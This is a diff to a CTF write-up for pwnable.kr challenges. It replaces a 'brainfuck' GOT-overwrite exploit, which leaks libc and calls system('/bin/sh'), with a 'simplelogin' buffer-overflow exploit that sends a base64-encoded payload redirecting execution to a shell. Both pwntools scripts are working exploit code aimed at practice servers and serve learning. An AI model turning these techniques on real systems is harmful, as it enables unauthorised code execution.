@@ -110,74 +110,21 @@ So if we can write only 12 bytes, it means that we can only overwrite the `saved
 ## Exploit Code
 ```python
 from pwn import *
+import base64
 
-context(log_level='debug', os='linux', arch='i386')
+context.log_level = 'info'
+context(os='linux', arch='i386')
 
-session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest') # When I solved this challenge, nc did not work
-p = session.process('./brainfuck')
+session = ssh(user='simplelogin', host='pwnable.kr', port=2222, password='guest')
+p = session.process(['nc', '0', '9003'])
 
-# Local files for finding offsets (which are not affected by ASLR)
-e = ELF(r'/mnt/c/users/dalal/desktop/private_projects/ctf/pwnable.kr/brainfuck/brainfuck')
-libc = ELF(r'/usr/lib32/libc.so.6')
+payload = b"A" * 4 # EBP junk value
+payload += p32(0x08049278) # EIP address of system("/bin/sh")
+payload += p32(0x0811eb40) # Address of the buffer I write to
+payload = base64.b64encode(payload)
+print(payload)
 
-fgets_got = e.got['fgets']
-memset_got = e.got['memset']
-putchar_got = e.got['putchar']
-
-# Libc offsets
-fgets_offset = libc.symbols['fgets']
-gets_offset = libc.symbols['gets']
-system_offset = libc.symbols['system']
-main_addr = 0x08048700 # does not affected by ASLR
-
-tape_addr = 0x804a0a0
-
-payload = ""
-
-# Move to fgets@got
-payload += "<" * (tape_addr - fgets_got)
-
-# Leak 4 bytes of fgets address
-payload += ".>" * 4
-payload += "<" * 4 
-
-# Overwrite fgets@got with system address
-payload += ",>" * 4
-payload += "<" * 4
-
-# Move to memset@got
-payload += ">" * (memset_got - fgets_got)
-
-# Overwrite memset@got with gets address
-payload += ",>" * 4
-
-# Overwrite putchar@got with main address (The pointer is already in putchar@got so no need to move)
-payload += ",>" * 4
-
-# Trigger main() by calling putchar
-payload += "."
-
-p.sendlineafter(b"type some brainfuck instructions except [ ]\n", payload.encode())
-sleep(0.1)
-
-fgets_addr = u32(p.recvn(4))
-
-libc_base = fgets_addr - fgets_offset
-system_addr = libc_base + system_offset
-gets_addr = libc_base + gets_offset
-
-log.info(f"fgets_addr: {hex(fgets_addr)}")
-log.info(f"libc base: {hex(libc_base)}")
-log.info(f"system_addr: {hex(system_addr)}")
-log.info(f"gets_addr: {hex(gets_addr)}")
-log.info(f"main_addr: {hex(main_addr)}")
-
-payload = p32(system_addr) + p32(gets_addr) + p32(main_addr)
-p.send(payload)
-sleep(0.3)
-
-p.send(b"/bin/sh") # Send "/bin/sh" to trigger system("/bin/sh")
-
-session.interactive()
+p.sendline(payload)
+p.interactive()
 ```
 
